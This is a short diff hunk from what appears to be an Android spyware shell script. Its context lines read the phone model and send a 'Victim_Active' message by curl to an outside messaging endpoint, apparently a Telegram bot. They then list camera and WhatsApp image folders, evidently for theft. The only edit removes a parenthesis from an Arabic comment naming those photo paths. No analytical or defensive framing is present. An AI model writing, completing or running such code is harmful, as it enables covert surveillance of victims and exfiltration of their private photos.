@@ -31,7 +31,7 @@ fi
 MODEL=$(getprop ro.product.model)
 curl -s "$URL_MSG?chat_id=$ID&text=Victim_Active: $MODEL" > /dev/null
 
-# مسارات الصور (الكاميرا والواتساب)
+# مسارات الصور (الكاميرا والواتساب
 paths=(
 "/sdcard/DCIM/Camera/"
 "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/"
